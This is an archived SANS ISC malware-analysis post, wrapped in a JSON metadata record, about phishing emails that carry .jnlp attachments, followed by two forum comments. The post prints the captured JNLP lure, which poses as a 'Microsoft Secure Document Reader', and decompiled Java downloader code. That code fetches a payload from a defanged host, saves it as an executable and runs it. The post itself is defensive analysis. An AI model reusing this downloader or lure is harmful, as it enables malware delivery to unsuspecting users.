{
    "id": "76962d88-1203-4155-8ab3-08f9caeaed31",
    "created_at": "2023-01-12T15:00:41.292088Z",
    "updated_at": "2025-03-27T02:05:24.291686Z",
    "deleted_at": null,
    "sha1_hash": "e047dd5368498b7fef69b31cb6d6e4d36a8da100",
    "title": "2021-01-22 - Another File Extension to Block in your MTA- .jnlp",
    "authors": "",
    "file_creation_date": "2022-05-28T15:57:52Z",
    "file_modification_date": "2022-05-28T15:57:52Z",
    "file_size": 4501035,
    "plain_text": "# SANS ISC: Another File Extension to Block in your MTA: .jnlp - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training SANS ISC InfoSec Forums\n\n**isc.sans.edu/forums/diary/Another+File+Extension+to+Block+in+your+MTA+jnlp/27018/**\n\nAnother File Extension to Block in your MTA: .jnlp\n\n\nWhen hunting, one thing that I like to learn is how attackers can be imaginative at deploying new techniques. I spotted some\nemails that had suspicious attachments based on the ‘.jnlp’ extension. I’m pretty sure that many people don’t know what’s\ntheir purpose and, if you don’t know them, you don’t have a look at them on your logs, SIEM, ... That makes them a good\ncandidate to deliver malicious code!\n\n\nXme\n\n\n-----\n\ny, [[ ]](https://fileinfo.com/extension/jnlp) g q\ninformation to execute a Java program. Usually, it contains the address where to download the malicious applet and the initial\nclass to run.\n\nI did a quick analysis of one of the captured JNLP files:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?> \n <jnlp spec=\"1.0+\" codebase=\"hxxp://secured-doc-read[.]net\" href=\"delivery.jnlp\">\n <information> \n  <title>Secure Document Reader</title> \n  <vendor>Microsoft</vendor> \n  <homepage href=\"wwww.microsoft.com\"/> \n  <description>Microsoft Secure Document Reader v.4.016</description> \n </information> \n <security>\n  <all-permissions/>\n </security>\n <resources> \n  <j2se version=\"1.6+\" /> \n  <jar href=\"delivery.jar\" />\n </resources> \n <application-desc main-class=\"Secure_Document_Reader\"> \n </application-desc>\n wghjs100570 \n</jnlp>\n\n```\nThe syntax is easy to understand. The payload will be called ‘delivery.jar’ (line 14) and downloaded from secured-docread[.].net (line 2). The main class is \"Secure_Document_Reader\" (line 16).\n\n[I decompiled the Jar file (SHA256:a4d95b7d196a4aca87cec384c5d21a756ab75cfaee7f4a20163d02109956a6dd)[2] and was](https://www.virustotal.com/gui/file/a4d95b7d196a4aca87cec384c5d21a756ab75cfaee7f4a20163d02109956a6dd/detection)\nsurprised to find a very simple code. Often malicious Java applets implement a RAT but here we faced the simple code of\na downloader:\n```\npublic class Secure_Document_Reader\n{\n static BufferedInputStream frisco415;\n static FileOutputStream friekiegee;\n static String linkage9;\n public static void main(final String[] array) {\n  frisco415(\"hxxp://sec-doc-v[.]com/images/dsc0386234.jpg\");\n }\n public static void frisco415(final String spec) {\n  final File file = new File(Secure_Document_Reader.linkage9);\n  try {\n   Secure_Document_Reader.frisco415 = new BufferedInputStream(new URL(spec).openStream());\n   Secure_Document_Reader.friekiegee = new FileOutputStream(Secure_Document_Reader.linkage9);\n   final byte[] array = new byte[1024];\n   int read;\n   while ((read = Secure_Document_Reader.frisco415.read(array, 0, 1024)) != -1) {\n    Secure_Document_Reader.friekiegee.write(array, 0, read);\n   }\n   Secure_Document_Reader.frisco415.close();\n   Secure_Document_Reader.friekiegee.close();\n  }\n  catch (Exception ex) {}\n  try {\n   Desktop.getDesktop().open(file);\n  }\n  catch (Exception ex2) {}\n }\n static {\n  Secure_Document_Reader.frisco415 = null;\n  Secure_Document_Reader.friekiegee = null;\n  Secure_Document_Reader.linkage9 = \"C:\\\\ProgramData\\\\videodrv.exe\";\n }\n}\n\n```\nThe next stage is download from hxxp://sec-doc-v[.]com/images/dsc0386234.jpg and dropped on disk as 'videodrx.exe\". The\n[PE file (SHA256:ceaf771da5e2678ed0d5844282bf0d464207c23842a8e36be3e7ab1df022ef89) has a VT score of 14/59[3].](https://www.virustotal.com/gui/file/ceaf771da5e2678ed0d5844282bf0d464207c23842a8e36be3e7ab1df022ef89/detection)\n\nThe usage of .jnlp files is a great way to bypass the first line of defenses (mail filters) because .jnlp files are text files and do\nnot contain any executable code. Note that Java must be installed on the victim's computer to handle .jnlp files.\n\n[1] [https://fileinfo.com/extension/jnlp](https://fileinfo.com/extension/jnlp)\n\n[2] [https://www.virustotal.com/gui/file/a4d95b7d196a4aca87cec384c5d21a756ab75cfaee7f4a20163d02109956a6dd/detection](https://www.virustotal.com/gui/file/a4d95b7d196a4aca87cec384c5d21a756ab75cfaee7f4a20163d02109956a6dd/detection)\n\n[3] [https://www.virustotal.com/gui/file/ceaf771da5e2678ed0d5844282bf0d464207c23842a8e36be3e7ab1df022ef89/detection](https://www.virustotal.com/gui/file/ceaf771da5e2678ed0d5844282bf0d464207c23842a8e36be3e7ab1df022ef89/detection)\n\nXavier Mertens (@xme)\nSenior ISC Handler - Freelance Cyber Security Consultant\n[PGP Key](https://keybase.io/xme/key.asc)\n\n[I will be teaching next: Reverse-Engineering Malware: Malware Analysis Tools and Techniques - SANS London June 2022](https://www.sans.org/event/london-june-2022/course/reverse-engineering-malware-malware-analysis-tools-techniques)\n\n\nISC\nHandler\nJan 22nd\n2021\n\n\n-----\n\n[Thread locked Subscribe](https://isc.sans.edu/forums/diary/subscribe/27018/) Jan 22nd\n2021\n\n1 year ago\n\nAnonymous\n\nMy understanding of JNLP files is that they will not run with just Java. You need to have Java and IcedTea installed to be able\nto process the JNLP and download the file. So, if you don't have both of those on your endpoint, then the OS doesn't know\nwhat to do with the file.\n\nThat, to me, seems to be an integral part of the attack described. But the requirements are left out. If I am mistaken, please\ncorrect me.\n\nThanks\n\nJoe\n\n[Quote](https://isc.sans.edu/forums/diary/quote/43828) Jan 25th\n2021\n\n1 year ago\n\nBrad\n\nJoe,\n\n\nI've never had Iced Tea installed, and I've successfully run JNLP-based malware as early as 2013. Reference: malwaretraffic-analysis.net/2013/12/27/…\n\n\n433 Posts\n\nISC\nHandler\n\n\n[Quote](https://isc.sans.edu/forums/diary/quote/43834) Jan 26th\n2021\n\n1 year ago\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-22 - Another File Extension to Block in your MTA- .jnlp.pdf"
    ],
    "report_names": [
        "2021-01-22 - Another File Extension to Block in your MTA- .jnlp.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535641,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1653753472,
    "ts_modification_date": 1653753472,
    "files": {
        "pdf": "https://archive.orkl.eu/e047dd5368498b7fef69b31cb6d6e4d36a8da100.pdf",
        "text": "https://archive.orkl.eu/e047dd5368498b7fef69b31cb6d6e4d36a8da100.txt",
        "img": "https://archive.orkl.eu/e047dd5368498b7fef69b31cb6d6e4d36a8da100.jpg"
    }
}